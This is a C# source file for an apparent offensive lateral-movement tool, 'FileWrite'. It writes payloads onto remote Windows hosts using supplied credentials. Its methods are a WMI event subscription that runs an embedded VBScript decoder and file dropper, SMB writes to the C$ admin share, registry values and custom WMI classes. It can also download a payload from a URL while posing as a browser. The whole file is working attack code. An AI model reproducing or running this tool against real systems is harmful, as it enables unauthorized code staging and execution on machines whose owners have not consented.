using System;
using System.IO;
using System.Net;
using System.Management;
using System.Collections.Generic;

namespace FileWrite
{
    class Program
    {
        public static string vbsp = @"
Call ServiceBuilder(pLoad, fnames, droploc)

Function ServiceChecker(ByVal base64String)
  Const Base64 = ""ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz0123456789+/""
  Dim dataLength, sOut, groupBegin
  base64String = Replace(base64String, vbCrLf, """")
  base64String = Replace(base64String, vbTab, """")
  base64String = Replace(base64String, "" "", """")

  dataLength = Len(base64String)
  If dataLength Mod 4 <> 0 Then
    Err.Raise 1, ""Base64Decode"", ""Bad Base64 string""
    Exit Function
  End If
  For groupBegin = 1 To dataLength Step 4
    Dim numDataBytes, CharCounter, thisChar, thisData, nGroup, pOut
    numDataBytes = 3
    nGroup = 0

    For CharCounter = 0 To 3
      thisChar = Mid(base64String, groupBegin + CharCounter, 1)
      If thisChar = ""="" Then
        numDataBytes = numDataBytes - 1
        thisData = 0
      Else
        thisData = InStr(1, Base64, thisChar, vbBinaryCompare) - 1
      End If
      If thisData = -1 Then
        Err.Raise 2, ""Base64Decode"", ""Bad character In Base64 string""
        Exit Function
      End If
      nGroup = 64 * nGroup + thisData
    Next
    nGroup = Hex(nGroup)
    nGroup = String(6 - Len(nGroup), ""0"") & nGroup
    pOut = Chr(CByte(""&H"" & Mid(nGroup, 1, 2))) + _
      Chr(CByte(""&H"" & Mid(nGroup, 3, 2))) + _
      Chr(CByte(""&H"" & Mid(nGroup, 5, 2)))
    sOut = sOut & Left(pOut, numDataBytes)
  Next
  ServiceChecker = sOut
End Function

Function ServiceBuilder(ByVal codelines, fname, floc)
    Set oShell = CreateObject(""WScript.Shell"")
    Set oFile = CreateObject(""Scripting.Filesystemobject"")
    If floc = Empty Then
        floc = oShell.CurrentDirectory
    End If
    If fname = Empty Then
        fname = ""winsvc""
    End If
    filelocation = floc & ""\"" & fname
    wbsi = ServiceChecker(codelines)
    Set myfile = oFile.CreateTextFile(filelocation, False)
    myfile.WriteLine(wbsi)
    myfile.close()
    Set oShell = Nothing
    Set oFile = Nothing
End Function
";
        public static string datavals = string.Empty;

        static void WriteToFileWMI(string host, string eventName, string username, string password)
        {
            try
            {
                ConnectionOptions options = new ConnectionOptions();
                if (!String.IsNullOrEmpty(username))
                {
                    Console.WriteLine("[*] User credentials   : {0}", username);
                    options.Username = username;
                    options.Password = password;
                }
                Console.WriteLine();

                // first create a 5 second timer on the remote host
                ManagementScope timerScope = new ManagementScope(string.Format(@"\\{0}\root\cimv2", host), options);
                ManagementClass timerClass = new ManagementClass(timerScope, new ManagementPath("__IntervalTimerInstruction"), null);
                ManagementObject myTimer = timerClass.CreateInstance();
                myTimer["IntervalBetweenEvents"] = (UInt32)5000;
                myTimer["SkipIfPassed"] = false;
                myTimer["TimerId"] = "Timer";
                try
                {
                    Console.WriteLine("[+] Creating Event Subscription {0}   : {1}", eventName, host);
                    myTimer.Put();
                }
                catch (Exception ex)
                {
                    Console.WriteLine("[X] Exception in creating timer object: {0}", ex.Message);
                    return;
                }

                ManagementScope scope = new ManagementScope(string.Format(@"\\{0}\root\subscription", host), options);

                // then install the __EventFilter for the timer object
                ManagementClass wmiEventFilter = new ManagementClass(scope, new ManagementPath("__EventFilter"), null);
                WqlEventQuery myEventQuery = new WqlEventQuery(@"SELECT * FROM __TimerEvent WHERE TimerID = 'Timer'");
                ManagementObject myEventFilter = wmiEventFilter.CreateInstance();
                myEventFilter["Name"] = eventName;
                myEventFilter["Query"] = myEventQuery.QueryString;
                myEventFilter["QueryLanguage"] = myEventQuery.QueryLanguage;
                myEventFilter["EventNameSpace"] = @"\root\cimv2";
                try
                {
                    myEventFilter.Put();
                }
                catch (Exception ex)
                {
                    Console.WriteLine("[X] Exception in setting event filter   : {0}", ex.Message);
                }


                // now create the ActiveScriptEventConsumer payload (VBS)
                ManagementObject myEventConsumer = new ManagementClass(scope, new ManagementPath("ActiveScriptEventConsumer"), null).CreateInstance();

                myEventConsumer["Name"] = eventName;
                myEventConsumer["ScriptingEngine"] = "VBScript";
                myEventConsumer["ScriptText"] = vbsp;
                myEventConsumer["KillTimeout"] = (UInt32)45;

                try
                {
                    myEventConsumer.Put();
                }
                catch (Exception ex)
                {
                    Console.WriteLine("[X] Exception in setting event consumer: {0}", ex.Message);
                }


                // finally bind them together with a __FilterToConsumerBinding
                ManagementObject myBinder = new ManagementClass(scope, new ManagementPath("__FilterToConsumerBinding"), null).CreateInstance();

                myBinder["Filter"] = myEventFilter.Path.RelativePath;
                myBinder["Consumer"] = myEventConsumer.Path.RelativePath;

                try
                {
                    myBinder.Put();
                }
                catch (Exception ex)
                {
                    Console.WriteLine("[X] Exception in setting FilterToConsumerBinding: {0}", ex.Message);
                }


                // wait for everything to trigger
                Console.WriteLine("\r\n[+] Waiting 10 seconds for event '{0}' to trigger\r\n", eventName);
                System.Threading.Thread.Sleep(10 * 1000);
                Console.WriteLine("[+] Done...cleaning up");
                // cleanup
                try
                {
                    myTimer.Delete();
                }
                catch (Exception ex)
                {
                    Console.WriteLine("[X] Exception in removing 'Timer' interval timer: {0}", ex.Message);
                }

                try
                {
                    myBinder.Delete();
                }
                catch (Exception ex)
                {
                    Console.WriteLine("[X] Exception in removing FilterToConsumerBinding: {0}", ex.Message);
                }

                try
                {
                    myEventFilter.Delete();
                }
                catch (Exception ex)
                {
                    Console.WriteLine("[X] Exception in removing event filter: {0}", ex.Message);
                }

                try
                {
                    myEventConsumer.Delete();
                }
                catch (Exception ex)
                {
                    Console.WriteLine("[X] Exception in removing event consumer: {0}", ex.Message);
                }
            }
            catch (Exception ex)
            {
                Console.WriteLine(String.Format("[X] Exception : {0}", ex.Message));
            }
        }

        static void WriteToFileSMB(string host, string droploc, string fname, string paylocation)
        {
            try
            {
                byte[] filen = null;
                var writeuncpath = String.Format(@"\\{0}\C${1}\{2}", host, droploc, fname);
                //this is meant to be updated to compile file into assembly
                if (Path.IsPathRooted(paylocation))
                {
                    filen = File.ReadAllBytes(paylocation);
                }
                Console.WriteLine("[+] Writing data to      :  {0}", host);
                File.WriteAllBytes(writeuncpath, filen);
            }
            catch (Exception ex)
            {
                Console.WriteLine("[X] Error     :  {0}", ex.Message);
                return;
            }
        }

        static void WriteToRegKey(string host, string username, string password, string keypath, string valuename)
        {
            if (!keypath.Contains(":"))
            {
                Console.WriteLine("[-] Please put ':' inbetween hive and path: HKCU:Location\\Of\\Key");
                return;
            }
            string[] reginfo = keypath.Split(':');
            string reghive = reginfo[0];
            string wmiNameSpace = "root\\CIMv2";
            UInt32 hive = 0;
            switch (reghive.ToUpper())
            {
                case "HKCR":
                    hive = 0x80000000;
                    break;
                case "HKCU":
                    hive = 0x80000001;
                    break;
                case "HKLM":
                    hive = 0x80000002;
                    break;
                case "HKU":
                    hive = 0x80000003;
                    break;
                case "HKCC":
                    hive = 0x80000005;
                    break;
                default:
                    Console.WriteLine("[X] Error     :  Could not get the right reg hive");
                    return;
            }
            ConnectionOptions options = new ConnectionOptions();
            Console.WriteLine("[+] Target             : {0}", host);
            if (!String.IsNullOrEmpty(username))
            {
                Console.WriteLine("[+] User               : {0}", username);
                options.Username = username;
                options.Password = password;
            }
            Console.WriteLine();
            ManagementScope scope = new ManagementScope(String.Format("\\\\{0}\\{1}", host, wmiNameSpace), options);
            try
            {
                scope.Connect();
                Console.WriteLine("[+] WMI connection established");
            }
            catch (Exception ex)
            {
                Console.WriteLine("[X] Failed to connect to to WMI    : {0}", ex.Message);
                return;
            }

            try
            {
                //Probably stay with string value only
                ManagementClass registry = new ManagementClass(scope, new ManagementPath("StdRegProv"), null);
                ManagementBaseObject inParams = registry.GetMethodParameters("SetStringValue");
                inParams["hDefKey"] = hive;
                inParams["sSubKeyName"] = reginfo[1];
                inParams["sValueName"] = valuename;
                inParams["sValue"] = datavals;
                ManagementBaseObject outParams = registry.InvokeMethod("SetStringValue", inParams, null);
                if(Convert.ToInt32(outParams["ReturnValue"]) == 0)
                {
                    Console.WriteLine("[+] Created {0} {1} and put content inside", keypath, valuename);
                }
                else
                {
                    Console.WriteLine("[-] An error occured, please check values");
                    return;
                }
            }
            catch (Exception ex)
            {
                Console.WriteLine(String.Format("[X] Error      :  {0}", ex.Message));
                return;
            }
        }

        static void WriteToWMIClass(string host, string username, string password, string wnamespace, string classname)
        {
            ConnectionOptions options = new ConnectionOptions();
            Console.WriteLine("[+] Target             : {0}", host);
            if (!String.IsNullOrEmpty(username))
            {
                Console.WriteLine("[+] User               : {0}", username);
                options.Username = username;
                options.Password = password;
            }
            Console.WriteLine();
            ManagementScope scope = new ManagementScope(String.Format("\\\\{0}\\{1}", host, wnamespace), options);
            try
            {
                scope.Connect();
                Console.WriteLine("[+] WMI connection established");
            }
            catch (Exception ex)
            {
                Console.WriteLine("[X] Failed to connecto to WMI    : {0}", ex.Message);
                return;
            }
            try
            {
                var nclass = new ManagementClass(scope, new ManagementPath(string.Empty), new ObjectGetOptions());
                nclass["__CLASS"] = classname;
                nclass.Qualifiers.Add("Static", true);
                nclass.Properties.Add("WinVal", CimType.String, false);
                nclass.Properties["WinVal"].Qualifiers.Add("read", true);
                nclass["WinVal"] = datavals;
                //nclass.Properties.Add("Sizeof", CimType.String, false);
                //nclass.Properties["Sizeof"].Qualifiers.Add("read", true);
                //nclass.Properties["Sizeof"].Qualifiers.Add("Description", "Value needed for Windows");
                nclass.Put();

                Console.WriteLine("[+] Create WMI Class     :   {0} {1}", wnamespace, classname);
            }
            catch (Exception ex)
            {
                Console.WriteLine(String.Format("[X] Error     :  {0}", ex.Message));
                return;
            }
        }

        static void RemoveRegValue(string host, string username, string password, string keypath, string keyname)
        {
            if (!keypath.Contains(":"))
            {
                Console.WriteLine("[-] Please put ':' inbetween hive and path: HKCU:Location\\Of\\Key");
                return;
            }
            if (!String.IsNullOrEmpty(host))
            {
                host = "127.0.0.1";
            }
            string[] reginfo = keypath.Split(':');
            string reghive = reginfo[0];
            string wmiNameSpace = "root\\CIMv2";
            UInt32 hive = 0;
            switch (reghive.ToUpper())
            {
                case "HKCR":
                    hive = 0x80000000;
                    break;
                case "HKCU":
                    hive = 0x80000001;
                    break;
                case "HKLM":
                    hive = 0x80000002;
                    break;
                case "HKU":
                    hive = 0x80000003;
                    break;
                case "HKCC":
                    hive = 0x80000005;
                    break;
                default:
                    Console.WriteLine("[X] Error     :  Could not get the right reg hive");
                    return;
            }
            ConnectionOptions options = new ConnectionOptions();
            Console.WriteLine("[+] Target             : {0}", host);
            if (!String.IsNullOrEmpty(username))
            {
                Console.WriteLine("[+] User               : {0}", username);
                options.Username = username;
                options.Password = password;
            }
            Console.WriteLine();
            ManagementScope scope = new ManagementScope(String.Format("\\\\{0}\\{1}", host, wmiNameSpace), options);
            try
            {
                scope.Connect();
                Console.WriteLine("[+]  WMI connection established");
            }
            catch (Exception ex)
            {
                Console.WriteLine("[X] Failed to connecto to WMI    : {0}", ex.Message);
                return;
            }

            try
            {
                //Probably stay with string value only
                ManagementClass registry = new ManagementClass(scope, new ManagementPath("StdRegProv"), null);
                ManagementBaseObject inParams = registry.GetMethodParameters("DeleteValue");
                inParams["hDefKey"] = hive;
                inParams["sSubKeyName"] = keypath;
                inParams["sValueName"] = keyname;
                ManagementBaseObject outParams1 = registry.InvokeMethod("DeleteValue", inParams, null);
                Console.WriteLine("[+] Deleted value at {0} {1}", keypath, keyname);
            }
            catch (Exception ex)
            {
                Console.WriteLine(String.Format("[-] {0}", ex.Message));
                return;
            }
        }

        static void RemoveWMIClass(string host, string username, string password, string wnamespace, string classname)
        {
            if (!String.IsNullOrEmpty(wnamespace))
            {
                wnamespace = "root\\CIMv2";
            }
            if (!String.IsNullOrEmpty(host))
            {
                host = "127.0.0.1";
            }
            ConnectionOptions options = new ConnectionOptions();
            Console.WriteLine("[+] Target             : {0}", host);
            if (!String.IsNullOrEmpty(username))
            {
                Console.WriteLine("[+] User               : {0}", username);
                options.Username = username;
                options.Password = password;
            }
            Console.WriteLine();
            ManagementScope scope = new ManagementScope(String.Format("\\\\{0}\\{1}", host, wnamespace), options);
            try
            {
                scope.Connect();
                Console.WriteLine("[+]  WMI connection established");
            }
            catch (Exception ex)
            {
                Console.WriteLine("[X] Failed to connecto to WMI    : {0}", ex.Message);
                return;
            }
            try
            {
                var rmclass = new ManagementClass(scope, new ManagementPath(classname), new ObjectGetOptions());
                rmclass.Delete();
            }
            catch (Exception ex)
            {
                Console.WriteLine(String.Format("[-] {0}", ex.Message));
                return;
            }
        }

        static void GetFileContent(string paylocation, string droploc, string fname, string dtype)
        {
            bool uricheck = Uri.IsWellFormedUriString(paylocation, UriKind.RelativeOrAbsolute);
            if (paylocation == "local")
            {
                String plfile = "LOADLOADLOAD";
                if(dtype == "flat")
                {
                    String finalpay = String.Format("Dim pLoad, fnames, droploc\npLoad =\"{0}\"\nfnames = \"{1}\"\ndroploc = \"{2}\"\n", plfile, fname, droploc);
                    vbsp = vbsp.Insert(0, finalpay);
                }
                else if (dtype == "nonflat")
                {
                    datavals = plfile;
                }
            }
            else
            {
                if (uricheck)
                {
                    try
                    {
                        WebClient webcl = new WebClient();
                        //May want to change this
                        webcl.Headers.Add("user-agent", "Mozilla/5.0 (Windows NT 6.1; WOW64; Trident/7.0; rv:11.0) like Gecko");
                        byte[] filedata = webcl.DownloadData(paylocation);
                        string plfile = Convert.ToBase64String(filedata);
                        if (dtype == "flat")
                        {
                            String finalpay = String.Format("Dim pLoad, fnames, droploc\npLoad =\"{0}\"\nfnames = \"{1}\"\ndroploc = \"{2}\"\n", plfile, fname, droploc);
                            vbsp = vbsp.Insert(0, finalpay);
                        }
                        else if (dtype == "nonflat")
                        {
                            datavals = plfile;
                        }
                    }
                    catch (WebException)
                    {
                        Console.WriteLine("[X] URL doesnt exist");
                        return;
                    }
                }
                else
                {
                    try
                    {
                        Byte[] plbytes = File.ReadAllBytes(paylocation);
                        String plfile = Convert.ToBase64String(plbytes);
                        if(dtype == "flat")
                        {
                            String finalpay = String.Format("Dim pLoad, fnames, droploc\npLoad =\"{0}\"\nfnames = \"{1}\"\ndroploc = \"{2}\"\n", plfile, fname, droploc);
                            vbsp = vbsp.Insert(0, finalpay);
                        }
                        else if (dtype == "nonflat")
                        {
                            datavals = plfile;
                        }
                    }
                    catch (IOException)
                    {
                        Console.WriteLine("[X] File doesnt exist");
                        return;
                    }
                }
            }
        }

        static void Usage()
        {
            Console.WriteLine("\n  Write Files");
            Console.WriteLine("");
            Console.WriteLine("   FileWrite.exe computername=host.domain.local writetype=wmi eventname=TestTask location=local droplocation=\"C:\\Windows\\Temp\" filename=move.exe");
            Console.WriteLine("   FileWrite.exe computername=host.domain.local writetype=smb droplocation=\"C:\\Windows\\Temp\" filename=move.exe");

        }

        static void Main(string[] args)
        {
            if (args.Length < 2)
            {
                Usage();
                return;
            }

            var arguments = new Dictionary<string, string>();
            foreach (string argument in args)
            {
                int idx = argument.IndexOf('=');
                if (idx > 0)
                    arguments[argument.Substring(0, idx)] = argument.Substring(idx + 1);
            }

            string username = "";
            string password = "";

            if (arguments.ContainsKey("username"))
            {
                if (!arguments.ContainsKey("password"))
                {
                    Usage();
                    return;
                }
                else
                {
                    username = arguments["username"];
                    password = arguments["password"];
                }
            }
            if (arguments.ContainsKey("password") && !arguments.ContainsKey("username"))
            {
                Usage();
                return;
            }
            if (arguments.ContainsKey("computername"))
            {
                string[] computerNames = arguments["computername"].Split(',');
                string eventName = "Debug";
                string location = "local";
                string droplocation = @"C:\Windows\Temp";
                string wnamespace = "root\\CIMv2";
                string filename = string.Empty;
                string valuename = string.Empty;
                string keypath = string.Empty;
                string classname = string.Empty;
                foreach (string computerName in computerNames)
                {
                    if (arguments.ContainsKey("eventname"))
                    {
                        eventName = arguments["eventname"];
                    }
                    if (arguments.ContainsKey("location"))
                    {
                        location = arguments["location"];
                    }
                    if (arguments.ContainsKey("droplocation"))
                    {
                        droplocation = arguments["droplocation"];
                    }
                    if (arguments.ContainsKey("filename"))
                    {
                        filename = arguments["filename"];
                    }
                    if (arguments.ContainsKey("classname"))
                    {
                        classname = arguments["classname"];
                    }
                    if (arguments.ContainsKey("keypath"))
                    {
                        keypath = arguments["keypath"];
                    }
                    if (arguments.ContainsKey("valuename"))
                    {
                        valuename = arguments["valuename"];
                    }
                    if (arguments.ContainsKey("wminamespace"))
                    {
                        wnamespace = arguments["wminamespace"];
                    }

                    if (arguments.ContainsKey("writetype"))
                    {
                        if (arguments["writetype"].ToLower() == "wmi")
                        {
                            GetFileContent(location, droplocation, filename, "flat");
                            WriteToFileWMI(computerName, eventName, username, password);
                        }
                        else if (arguments["writetype"].ToLower() == "smb")
                        {
                            WriteToFileSMB(computerName, droplocation, filename, location);
                        }
                        else if(arguments["writetype"].ToLower() == "registry")
                        {
                            if (valuename == string.Empty)
                            {
                                Console.WriteLine("[-] Valuename is required");
                                return;
                            }
                            GetFileContent(location, droplocation, filename, "nonflat");
                            WriteToRegKey(computerName, username, password, keypath, valuename);
                        }
                        else if (arguments["writetype"].ToLower() == "wmiclass")
                        {
                            GetFileContent(location, droplocation, filename, "nonflat");
                            WriteToWMIClass(computerName, username, password, wnamespace, classname);
                        }
                        else if (arguments["writetype"].ToLower() == "removewmiclass")
                        {
                            RemoveWMIClass(computerName, username, password, wnamespace, classname);
                        }
                        else if (arguments["writetype"].ToLower() == "removeregkey")
                        {
                            RemoveRegValue(computerName, username, password, keypath, valuename);
                        }
                        else
                        {
                            Usage();
                            return;
                        }
                    }
                    else
                    {
                        Usage();
                    }
                }
            }
            else
            {
                Usage();
                return;
            }
        }
    }
}
